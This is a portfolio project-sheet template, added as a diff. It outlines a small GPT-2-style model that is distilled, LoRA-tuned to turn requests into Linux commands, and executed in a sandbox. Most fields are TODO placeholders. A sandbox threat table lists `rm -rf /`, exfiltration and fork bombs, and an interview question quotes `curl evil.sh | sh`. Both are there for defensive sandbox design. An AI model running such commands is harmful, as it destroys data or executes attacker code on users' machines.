@@ -1,0 +1,344 @@
+---
+# ══════════════════════════════════════════════════════════════════
+#  PROJECT SHEET – Small LLM for Linux commands (distillation + LoRA + sandbox)
+#  Structure is fixed; every TODO and every code block is yours to fill.
+#  <!-- comments --> are guidance, not rendered. Delete them as you go.
+#  This sheet is longer than the others on purpose: it is the "deep" project.
+#  The 1-page PDF version is produced from the same file; keep §4–§7 tight.
+# ══════════════════════════════════════════════════════════════════
+title: "A 500M-parameter LLM that runs Linux, distilled and sandboxed"
+subtitle: "GPT-2-scale decoder written from scratch, distilled from a larger teacher, LoRA-fine-tuned on Linux corpora, executing commands in a sandbox"
+description: "TODO — 2 lines: result + flagship tech (e.g. 'A from-scratch 500M decoder, loaded with GPT-2 weights, distilled from <teacher> and LoRA-tuned to translate natural language into shell commands executed in an isolated sandbox. X% task success on Y.')"
+date: 2026-09-17           # TODO: end / last major update
+categories: [ML, Systems]
+image: ../assets/linux-llm/cover.jpg
+status: "In progress"
+role: "Solo: model implementation, data generation, training, sandbox, evaluation"
+team: "Solo"
+duration: "TODO — since <month year>"
+context: "Personal project, trained on my homelab GPU node (RTX 2060, 6 GB VRAM)"
+stack: "Python, PyTorch, GPT-2 weights, LoRA (PEFT or hand-written), <teacher model>, Docker / <sandbox tech>, tiktoken"
+links:
+  repo: ""
+  demo: ""
+  paper: ""
+---
+
+::: {.project-meta}
+<dl>
+<dt>Status</dt><dd>{{< meta status >}}</dd>
+<dt>Role</dt><dd>{{< meta role >}}</dd>
+<dt>Team</dt><dd>{{< meta team >}}</dd>
+<dt>Duration</dt><dd>{{< meta duration >}}</dd>
+<dt>Context</dt><dd>{{< meta context >}}</dd>
+<dt>Stack</dt><dd>{{< meta stack >}}</dd>
+</dl>
+:::
+
+<!-- 1. PITCH — 2 sentences: the problem (turn a request into a shell command, safely, with a
+     model small enough to run locally) and the result with a number (task success rate,
+     latency, VRAM). Write it last. -->
+::: {.pitch}
+TODO
+:::
+
+## 1. Context
+
+<!-- 4–6 lines: why a *small* model (local, cheap, controllable) rather than calling an API;
+     why Linux commands (verifiable output, real tool-use loop); what you knew before
+     (had you implemented a transformer before? trained anything on a GPU?); hardware and
+     time constraints (6 GB VRAM changes every design choice below — say so). -->
+
+TODO
+
+## 2. The technical problem
+
+<!-- 5–10 lines. Four sub-problems, name them explicitly:
+     (a) build and load a working decoder-only transformer from scratch, verified against the
+         reference GPT-2 outputs;
+     (b) transfer the "knowledge" of a much larger teacher into it — what does distillation
+         actually transfer, and what is lost at 500M?
+     (c) fine-tune with a 6 GB budget — full fine-tune is impossible, hence LoRA; what is the
+         memory arithmetic? (weights + grads + Adam states, fp16/bf16, activation checkpointing)
+     (d) execute what the model outputs without it destroying the machine — sandbox design
+         and the feedback loop (command → stdout/stderr → next prompt).
+     What makes it hard overall: a 500M model hallucinates flags and paths; evaluation must be
+     *execution-based*, not string-match. -->
+
+TODO
+
+## 3. Architecture overview
+
+<!-- ONE diagram of the whole system: teacher → distilled dataset ─┐
+                                    public Linux corpora ─────────┴→ LoRA fine-tune → student
+                                    user request → student → command → sandbox → output → (loop)
+     Then the decision table. Fill "Why" with the real reason, incl. VRAM. -->
+
+![System overview — TODO](../assets/linux-llm/architecture.png){width=90%}
+
+| Decision | Choice made | Alternative rejected | Why |
+|---|---|---|---|
+| Student model | From-scratch GPT-2-style decoder, ~500M params, GPT-2 pretrained weights | Hugging Face `GPT2LMHeadModel` as-is; a modern small model (Qwen/Llama ≤1B) | TODO (learning goal? weight availability? VRAM?) |
+| Teacher | TODO | TODO | TODO |
+| Distillation type | TODO (sequence-level / logit-level / both) | TODO | TODO |
+| Fine-tuning method | LoRA (rank TODO) | Full fine-tune; QLoRA; prefix-tuning | TODO |
+| Training data | Distilled set + public Linux corpora (TODO names) | Distilled set only | TODO |
+| Sandbox | TODO (Docker? gVisor? firejail? nsjail? VM?) | TODO | TODO |
+| Evaluation | Execution-based (does the command achieve the task?) | Exact-match / BLEU on the command string | TODO |
+
+## 4. The LLM: architecture and weight loading
+
+### 4.1 Model
+
+<!-- Describe the decoder-only transformer in your own words, in the order data flows:
+     token embedding + learned positional embedding → N × [pre-LN, causal multi-head
+     self-attention, residual, pre-LN, MLP (4× width, GELU), residual] → final LN → tied
+     LM head. Give the exact hyperparameters in the table below. -->
+
+TODO — 5–8 lines of prose.
+
+| Hyperparameter | Value |
+|---|---|
+| Parameters | ~500M (TODO exact: which GPT-2 checkpoint?) |
+| Layers `n_layer` | TODO |
+| Hidden size `n_embd` | TODO |
+| Heads `n_head` / head dim | TODO |
+| MLP width | TODO (4 × n_embd?) |
+| Vocabulary | 50 257 (GPT-2 BPE) — TODO confirm |
+| Positional encoding | Learned absolute (GPT-2) — TODO |
+| Normalisation | Pre-LayerNorm — TODO |
+| Activation | GELU — TODO |
+| Weight tying | wte ↔ lm_head — TODO |
+| Dropout | TODO |
+| Precision | TODO (fp32 / bf16 / fp16 + loss scaling) |
+
+### 4.2 Sources used to build it
+
+<!-- The references you actually read/followed. Papers, blog posts, videos, repos. One line
+     each: what you took from it. Suggested rows below — keep, replace or delete. -->
+
+| Source | What I took from it |
+|---|---|
+| Vaswani et al., *Attention Is All You Need* (2017) | TODO |
+| Radford et al., *Language Models are Unsupervised Multitask Learners* (GPT-2, 2019) | TODO |
+| TODO (e.g. a from-scratch implementation you followed: nanoGPT, minGPT, a book, a video series) | TODO |
+| Hu et al., *LoRA: Low-Rank Adaptation of Large Language Models* (2021) | TODO |
+| Hinton et al., *Distilling the Knowledge in a Neural Network* (2015) | TODO |
+| TODO | TODO |
+
+### 4.3 Code — model definition
+
+<!-- Paste your model code. What this block must make visible to a reader:
+     - the attention block (QKV projection, causal mask, scaling, output projection)
+     - the MLP block
+     - the residual + pre-LN wiring
+     - the forward pass returning logits (and loss if targets given)
+     Keep it under ~120 lines: cut boilerplate, keep the parts you'd be asked about. -->
+
+```python
+# TODO: model.py — GPTConfig, CausalSelfAttention, MLP, Block, GPT
+```
+
+### 4.4 Code — loading the GPT-2 weights
+
+<!-- Paste the loader. What this block must make visible:
+     - the mapping from the checkpoint's parameter names to yours
+     - the transposition of the Conv1D weights (attn.c_attn, attn.c_proj, mlp.c_fc, mlp.c_proj)
+     - the dropped buffers (attention bias masks)
+     - the sanity check: same next-token logits as the reference on a fixed prompt. -->
+
+```python
+# TODO: load_gpt2_weights(model, checkpoint) + sanity check vs reference
+```
+
+### 4.5 Context window
+
+<!-- Numbers, and the reasoning behind each. -->
+
+| | Value | Why |
+|---|---|---|
+| Native GPT-2 context (`n_positions`) | 1 024 | TODO |
+| Training sequence length used | TODO | TODO (VRAM / typical prompt+command length) |
+| Inference max context | TODO | TODO |
+| Prompt format (system + history + last output) | TODO | TODO (how many turns of stdout fit?) |
+| Truncation / windowing strategy for long stdout | TODO | TODO |
+
+### 4.6 Tokenizer
+
+<!-- GPT-2 BPE via tiktoken or HF? Any added special tokens (e.g. <|cmd|>, <|out|>, <|end|>)?
+     If you added tokens: how did you initialise their embeddings? -->
+
+TODO
+
+## 5. Distillation from the teacher
+
+### 5.1 Teacher
+
+<!-- Name, size, how you ran it (API / local / homelab), cost, throughput. -->
+
+TODO
+
+### 5.2 What is distilled, and how
+
+<!-- Be precise about the kind of distillation:
+     - sequence-level (teacher generates (request, command, explanation) triples → student
+       trained by cross-entropy) — this is "synthetic data"; or
+     - logit-level (student matches teacher's soft distribution, KL at temperature T) — needs
+       a shared tokenizer or a mapping; or
+     - both.
+     Write the loss you used. Placeholder below — replace with yours. -->
+
+$$
+\mathcal{L} = \alpha\,\mathrm{CE}\big(y, p_S\big) \;+\; (1-\alpha)\,T^{2}\,\mathrm{KL}\big(p_T^{(T)} \,\|\, p_S^{(T)}\big)
+\quad\text{TODO: your actual loss}
+$$
+
+TODO — 5–8 lines: prompt design for the teacher, filtering (did you execute teacher commands to keep only the ones that work?), deduplication, train/val/test split.
+
+### 5.3 Distilled dataset
+
+| | Value |
+|---|---|
+| Number of examples | TODO |
+| Format | TODO (e.g. `{"task": …, "context": …, "command": …, "expected": …}`) |
+| Task families covered | TODO (files, text processing, processes, networking, permissions, …) |
+| Filtering rules | TODO |
+| Executed & verified? | TODO (% of teacher outputs that actually ran) |
+
+## 6. Fine-tuning with LoRA
+
+### 6.1 Datasets
+
+<!-- Distilled set + off-the-shelf corpora. One row per source. -->
+
+| Dataset | Size | Source / licence | Used for |
+|---|---|---|---|
+| Distilled (§5) | TODO | own | SFT |
+| TODO (e.g. NL2Bash, tldr pages, man pages, shell scripts) | TODO | TODO | TODO |
+| TODO | TODO | TODO | TODO |
+
+### 6.2 LoRA configuration
+
+<!-- The numbers you'd be asked about, and why. -->
+
+| | Value | Why |
+|---|---|---|
+| Rank $r$ | TODO | TODO |
+| $\alpha$ (scaling $\alpha/r$) | TODO | TODO |
+| Target modules | TODO (c_attn only? + c_proj, c_fc?) | TODO |
+| Dropout | TODO | |
+| Trainable params / total | TODO (%) | |
+| Learning rate, schedule, warm-up | TODO | |
+| Batch size × grad accumulation | TODO | TODO (VRAM) |
+| Epochs / steps | TODO | |
+| Precision, grad checkpointing | TODO | TODO |
+| Peak VRAM | TODO GB / 6 GB | |
+| Wall-clock | TODO | |
+
+### 6.3 Code — LoRA fine-tuning
+
+<!-- Paste the training code. What the block must make visible:
+     - how LoRA is injected (your own nn.Module with A, B, scaling — or PEFT config)
+     - which parameters are frozen
+     - the training loop or Trainer call, with loss masking (loss only on the command tokens?)
+     - merging the adapters back for inference. -->
+
+```python
+# TODO: lora.py — LoRALinear / PEFT config, freeze base, train loop, merge_and_unload
+```
+
+### 6.4 Training curves
+
+<!-- Train/val loss vs steps, one figure. If several runs (rank sweep, with/without distilled
+     data), overlay them — that *is* your ablation. -->
+
+![Training curves — TODO](../assets/linux-llm/training-curves.png){width=80%}
+
+## 7. Sandbox execution
+
+### 7.1 Design
+
+<!-- What isolates the command from the host: container / microVM / namespaces; read-only
+     root, no network, CPU/memory/time limits, allow-list or deny-list of binaries, how the
+     working directory is seeded and reset between tasks. -->
+
+TODO
+
+| Threat | Mitigation |
+|---|---|
+| `rm -rf /` and friends | TODO |
+| Network exfiltration | TODO |
+| Fork bomb / infinite loop | TODO |
+| Escape from the sandbox | TODO |
+| Prompt injection via file contents | TODO |
+
+### 7.2 The loop
+
+<!-- request → prompt → student generates command → (optional: guard / confirmation) →
+     sandbox executes → stdout/stderr truncated → appended to prompt → next command or stop.
+     Stop condition? Max turns? How is "task done" decided? -->
+
+TODO
+
+## 8. Evaluation & results
+
+<!-- Execution-based metric: a task is solved if a checker on the sandbox state passes.
+     Baselines: base GPT-2 (no tuning), student fine-tuned on public corpora only,
+     student + distilled data, and the teacher itself (upper bound). -->
+
+| Model | Task success (%) | Valid syntax (%) | Dangerous commands caught | Avg turns | Latency / cmd |
+|---|---|---|---|---|---|
+| GPT-2 base (no tuning) | TODO | TODO | TODO | TODO | TODO |
+| Student, public corpora only | TODO | TODO | TODO | TODO | TODO |
+| Student, public + distilled | TODO | TODO | TODO | TODO | TODO |
+| Teacher (upper bound) | TODO | TODO | TODO | TODO | TODO |
+
+TODO — 3–5 lines: what the numbers say, one or two qualitative examples (a success and a typical failure mode).
+
+## 9. Limits & what I would do differently
+
+- TODO — 500M is small: where it breaks (multi-step reasoning? rare tools? long stdout?)
+- TODO — GPT-2's 1 024 context vs the length of real terminal sessions
+- TODO — distillation: what the teacher's data biased the student towards
+- TODO — the sandbox is not a security boundary you'd trust in production; what it would take
+- TODO — next step with one more month (RL from execution feedback? a modern base model?)
+
+## 10. Links
+
+- Code: TODO
+- Demo (video of a session): TODO
+
+::: {.content-visible when-profile="prep"}
+
+## Interview prep (private)
+
+**Q — Walk me through one forward pass of your model, shapes included.**
+A — TODO
+
+**Q — Why did the GPT-2 checkpoint need the Conv1D weights transposed?**
+A — TODO
+
+**Q — Explain the LoRA update $W + \frac{\alpha}{r}BA$. Why does it save memory? What does the rank control?**
+A — TODO
+
+**Q — Sequence-level vs logit-level distillation: which did you use and why? What does the temperature do?**
+A — TODO
+
+**Q — Full fine-tune of a 500M model in fp32 with Adam: how much VRAM? Show the arithmetic.**
+A — TODO
+
+**Q — Why is exact-match a bad metric for shell commands? How does your checker work?**
+A — TODO
+
+**Q — How does your sandbox stop `curl evil.sh | sh`? What does it *not* stop?**
+A — TODO
+
+**Q — Why not just use a 1B modern open model instead of GPT-2 weights?**
+A — TODO
+
+**Q — What would change with a 24 GB GPU?**
+A — TODO
+
+**Concepts to review:** scaled dot-product attention and its memory cost; causal masking; KV cache; LayerNorm vs RMSNorm; GELU; BPE tokenisation; Adam state memory; mixed precision and loss scaling; gradient checkpointing; LoRA/QLoRA; knowledge distillation (Hinton 2015), sequence-level KD (Kim & Rush 2016); Linux namespaces, cgroups, seccomp; Docker vs gVisor vs microVMs.
+
+:::
